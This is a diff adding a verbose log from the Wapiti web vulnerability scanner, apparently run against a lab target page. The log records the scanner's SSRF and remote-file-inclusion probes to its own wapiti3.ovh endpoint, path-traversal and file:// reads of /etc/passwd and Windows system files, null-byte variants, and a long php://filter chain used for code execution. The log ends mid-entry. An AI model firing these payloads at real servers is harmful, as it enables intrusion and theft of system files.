@@ -1,0 +1,1179 @@
+2024-03-20 16:35:53.168 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:35:53.299 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit
+2024-03-20 16:35:53.299 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:35:53.300 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10
+2024-03-20 16:35:53.300 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:53.477 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:35:53.477 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_7e0d60e5.db
+2024-03-20 16:35:53.480 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
+2024-03-20 16:35:53.510 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:35:53.511 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:35:53.616 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:35:53.616 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:35:53.616 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:35:53.634 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:53.650 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:35:53.650 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:35:53.710 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 16:35:53.710 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:35:53.792 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:35:53.809 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:53.823 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:35:53.823 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F1%2F746172676574%2F&form=submit
+2024-03-20 16:35:53.846 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F1%2F666f726d%2F
+2024-03-20 16:35:53.879 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10
+2024-03-20 16:35:53.880 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F2%2F666f726d5f627567%2F&bug=10
+2024-03-20 16:35:53.888 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F2%2F627567%2F
+2024-03-20 16:35:53.907 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit
+2024-03-20 16:35:53.907 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F3%2F666f726d%2F
+2024-03-20 16:35:53.926 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:35:53.926 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F4%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
+2024-03-20 16:35:53.937 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2hoj39%2F4%2F73656375726974795f6c6576656c%2F
+2024-03-20 16:35:53.969 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=2hoj39 for results, please wait...
+2024-03-20 16:35:56.091 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:35:56.108 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:56.122 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:35:56.218 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:35:56.228 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:56.239 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:35:56.286 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10
+2024-03-20 16:35:56.308 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit
+2024-03-20 16:35:56.325 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:35:56.360 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:35:56.377 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:35:56.390 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:35:56.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&form=submit
+2024-03-20 16:35:56.410 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&form=submit
+2024-03-20 16:35:56.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:56.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:56.463 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.479 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit
+2024-03-20 16:35:56.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&form=submit
+2024-03-20 16:35:56.530 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&form=submit
+2024-03-20 16:35:56.546 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.565 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&form=submit
+2024-03-20 16:35:56.597 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&form=submit
+2024-03-20 16:35:56.614 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&form=submit
+2024-03-20 16:35:56.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:56.657 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:56.676 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:56.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:56.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.728 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.747 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.764 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.780 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.812 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.827 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:56.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&form=submit
+2024-03-20 16:35:56.881 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:56.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:56.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:56.941 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:56.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:56.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.042 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.061 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.106 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:57.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:57.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:57.158 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:57.176 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.233 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.251 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.267 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=file%3A%2F%2F%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:57.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit
+2024-03-20 16:35:57.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&form=submit
+2024-03-20 16:35:57.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&form=submit
+2024-03-20 16:35:57.388 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
